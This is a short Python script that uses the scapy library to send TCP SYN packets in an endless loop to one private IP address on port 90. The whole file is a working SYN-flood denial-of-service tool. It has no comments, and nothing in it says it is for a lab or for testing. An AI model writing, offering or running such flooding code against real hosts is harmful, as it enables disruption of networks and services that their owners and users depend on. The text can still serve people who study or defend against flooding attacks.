from scapy.all import IP, TCP, send

target_ip = "10.100.102.1"
target_port = 90

while True:
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, flags='S')
    syn_packet = ip / tcp
    send(syn_packet)

